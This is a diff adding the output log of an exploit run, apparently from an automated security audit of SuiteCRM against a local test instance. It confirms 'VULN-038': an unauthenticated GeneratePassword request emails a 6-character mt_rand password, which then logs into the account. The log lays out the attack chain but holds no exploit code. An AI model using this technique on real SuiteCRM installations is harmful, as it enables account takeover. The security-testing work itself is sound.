@@ -1,0 +1,17 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-038/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-038/../.venv
+========================================================================
+VULN-038: System-generated temp password = 6-char mt_rand (unauth reachable)
+target: http://localhost:33116
+========================================================================
+[SETUP] admin session established
+[SETUP] created attacker-controlled account mod_2f797c8d (id=a5bd0087-a953-4f6c-ba4c-af3005751749) -- this stands in for any account the attacker legitimately owns/registers
+[SETUP] SMTP catcher listening on 0.0.0.0:33123 (app reaches it at 172.18.0.1:33123)
+[SETUP] PasswordManager saveConfig -> status=302 loc='index.php?module=Administration&action=index' (mail_smtpserver=172.18.0.1:33123, SystemGeneratedPasswordON=True, forgotpasswordON=True)
+[SETUP] SystemGeneratedPasswordON enabled + system mailer pointed at our SMTP stub (both via the real Admin > Password Management screen)
+[STEP] UNAUTHENTICATED request to entryPoint=GeneratePassword (no cookie / session / auth header at all)
+[INFO] GeneratePassword response: HTTP 200 body='1'
+[PROOF] unauthenticated request caused a real email to be sent containing a 6-character mt_rand-derived password: 'pLh4gt' (alphabet A-Za-z0-9, matches generatePassword()'s charBKT/length exactly)
+[STEP] authenticating over HTTP using ONLY the captured password (mod_2f797c8d / pLh4gt)
+[PROOF] HTTP login with the mt_rand-derived password SUCCEEDED -- the value emailed by the unauthenticated GeneratePassword endpoint is the account's real, live credential (setNewPassword() was actually called), not merely display text.
+==> VULN-038: CONFIRMED — unauth GeneratePassword emitted 6-char mt_rand password 'pLh4gt' for mod_2f797c8d; confirmed as the real live credential by a successful HTTP login
